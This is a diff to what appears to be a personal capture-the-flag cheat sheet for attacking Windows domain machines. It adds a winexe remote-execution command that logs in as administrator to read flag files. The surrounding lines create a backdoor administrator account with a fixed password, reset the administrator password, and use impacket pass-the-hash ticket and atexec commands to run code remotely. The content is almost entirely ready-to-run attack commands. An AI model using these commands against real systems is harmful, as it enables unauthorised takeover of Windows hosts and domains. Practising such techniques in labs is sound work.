@@ -221,6 +221,8 @@ net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
 net user administrator 123qweasdF!
 
 ## GG - ROOT FLAG
+winexe -U '.\administrator%$PASSWORD' //$TARGET 'cmd.exe /c @for /d %F in (C:\Users\*) do @for %f in ("%F\Desktop\user.txt" "%F\Desktop\root.txt") do @if exist %f @type %f 2>NUL' | gg
+
 impacket-getTGT -dc-ip $TARGET $DOM/'administrator' -hashes ':$HASH'; kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
 
 impacket-atexec -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'@$TARGET "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
